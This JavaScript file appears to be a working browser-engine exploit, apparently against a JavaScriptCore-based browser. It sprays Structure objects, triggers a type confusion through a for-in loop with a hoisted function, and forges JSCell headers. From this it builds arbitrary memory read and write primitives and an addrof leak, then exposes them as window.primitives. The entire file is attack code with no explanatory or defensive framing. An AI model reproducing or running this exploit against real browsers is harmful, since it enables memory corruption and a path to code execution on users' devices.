function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

var INT64_SHARED_BUFFER = new ArrayBuffer(16);
var INT64_U32_VIEW = new Uint32Array(INT64_SHARED_BUFFER);
var INT64_F64_VIEW = new Float64Array(INT64_SHARED_BUFFER);

function int64(low, hi) {
    this.low = low | 0;
    this.hi = hi | 0;

    var self = this;
    
    this.add32inplace = function (val) {
        var new_lo = (self.low + val) >>> 0;
        var new_hi = self.hi;

        if (new_lo < self.low) {
            new_hi = (new_hi + 1) >>> 0;
        }

        self.hi = new_hi;
        self.low = new_lo;
    };

    this.add32 = function (val) {
        var new_lo = (self.low + val) >>> 0;
        var new_hi = self.hi;

        if (new_lo < self.low) {
            new_hi = (new_hi + 1) >>> 0;
        }

        return new int64(new_lo, new_hi);
    };

    this.sub32 = function (val) {
        var new_lo = (self.low - val) >>> 0;
        var new_hi = self.hi;

        if (new_lo > self.low) {
            new_hi = (new_hi - 1) >>> 0;
        }

        return new int64(new_lo, new_hi);
    };

    this.sub32inplace = function (val) {
        var new_lo = (self.low - val) >>> 0;
        var new_hi = self.hi;

        if (new_lo > self.low) {
            new_hi = (new_hi - 1) >>> 0;
        }

        self.hi = new_hi;
        self.low = new_lo;
    };

    this.and32 = function (val) {
        return new int64(self.low & val, self.hi);
    };

    this.and64 = function (vallo, valhi) {
        return new int64(self.low & vallo, self.hi & valhi);
    };

    this.toString = function (radix) {
        radix = radix || 16;
        var lo_str = (self.low >>> 0).toString(radix);
        var hi_str = (self.hi >>> 0).toString(radix);

        if (self.hi === 0) {
            return lo_str;
        }
        
        lo_str = ('00000000' + lo_str).slice(-8);
        return hi_str + lo_str;
    };

    this.toPacked = function () {
        return {
            hi: self.hi,
            low: self.low
        };
    };

    this.setPacked = function (pck) {
        self.hi = pck.hi;
        self.low = pck.low;
        return self;
    };

    this.u2d = function () {
        INT64_U32_VIEW[0] = self.low;
        INT64_U32_VIEW[1] = self.hi;
        return INT64_F64_VIEW[0];
    };

    this.asJSValue = function () {
        INT64_U32_VIEW[0] = self.low;
        INT64_U32_VIEW[1] = (self.hi - 0x10000) >>> 0;
        return INT64_F64_VIEW[0];
    };

    return this;
}

var STRUCTURE_SPRAY_SIZE = 0x600;

var g_confuse_obj = null;
var g_arb_master = null;
var g_arb_slave = new Uint32Array(0x1000);
var g_leaker = {};
var g_leaker_addr = null;
var g_structure_spray = [];

var dub = new int64(0x41414141, 0x41414141).u2d();
var g_inline_obj = {
    a: dub,
    b: dub,
};

function spray_structs() {
    for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
        var a = new Uint32Array(0x1);
        a["p" + i] = 0x1337;
        g_structure_spray.push(a); // keep the Structure objects alive.
    }

}

function trigger() {
    var o = {
        'a': 1
    };
    
    var test = new ArrayBuffer(0x1000);
    var test_buffer = test.buffer; 
    
    g_confuse_obj = {};
    
    var js_cell_header_val = new int64(0x00000800, 0x01182700).asJSValue();
    var len_flags_val = new int64(0x00000020, 0x00010001).asJSValue();
    
    var cell = {
        js_cell_header: js_cell_header_val,
        butterfly: false,
        vector: g_inline_obj,
        len_and_flags: len_flags_val
    };
    g_confuse_obj["0a"] = cell; 

    g_confuse_obj["1a"] = {};
    g_confuse_obj["1b"] = {};
    g_confuse_obj["1c"] = {};
    g_confuse_obj["1d"] = {};

    var Uint32ArrayCtor = Uint32Array;
    for (var j = 0x5; j < 0x20; j++) {
        g_confuse_obj[j + "a"] = new Uint32ArrayCtor(test);
    }
    
    var ArrayBufferCtor = ArrayBuffer;
    for (var k in o) {
        {
            k = {
                a: g_confuse_obj,
                b: new ArrayBufferCtor(test_buffer),
                c: new ArrayBufferCtor(test_buffer),
                d: new ArrayBufferCtor(test_buffer),
                e: new ArrayBufferCtor(test_buffer),
                1: new ArrayBufferCtor(test_buffer),
            };

            function k() {
                return k;
            }
        }

        o[k];

        if (g_confuse_obj["0a"] instanceof Uint32ArrayCtor) {
            return;
        }
    }
}

function setup_arb_rw() {
    var jsCellHeader = new int64(0x00000800, 0x01182700);
    g_fake_container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_arb_slave,
        lengthAndFlags: (new int64(0x00000020, 0x00010000)).asJSValue()
    };

    g_inline_obj.a = g_fake_container;
    g_confuse_obj["0a"][0x4] += 0x10;
    g_arb_master = g_inline_obj.a;
    
}

function read(addr, length) {
    var a = new Uint8Array(length);
    for (var i = 0; i < length; i++) {
        a[i] = read8(addr.add32(i)).low & 0xFF;
    }
    return a;
}

function read8(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = new int64(g_arb_slave[0] & 0xFF, 0);
    return retval;
}

function read32(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = g_arb_slave[0];
    return retval;
}

function read64(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = new int64(g_arb_slave[0], g_arb_slave[1]);

    return retval;
}

function write(addr, data) {
    addr_ = addr.add32(0);
    for (var i = 0; i < data.length; i++) {
        write8(addr_, data[i]);
        addr_.add32inplace(i);
    }
}

function write8(addr, val) {

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;
    var tmp = g_arb_slave[0] & 0xFFFFFF00;
    g_arb_slave[0] = val | tmp;
}

function write32(addr, val) {

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    g_arb_slave[0] = val;
}

function write64(addr, val) {
    if (!(val instanceof int64))
        val = new int64(val);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;
    g_arb_slave[0] = val.low;
    g_arb_slave[1] = val.hi;
}

function setup_obj_leaks() {
    
    g_inline_obj.a = g_leaker;
    g_leaker_addr = new int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add32(0x10);
}

function addrof(obj) {
    g_leaker.leak = obj;
    return read64(g_leaker_addr);
}

function start_exploit() {
    
    trigger();
    setup_arb_rw();
    setup_obj_leaks();
}

var prim = {
    write8: function (addr, val) {
        write64(addr, val);
    },

    write4: function (addr, val) {
        write32(addr, val);
    },

    read8: function (addr) {
        return read64(addr);
    },

    read4: function (addr) {
        return read32(addr);
    },

    leakval: function (jsval) {
        return addrof(jsval);
    },
};

window.primitives = prim;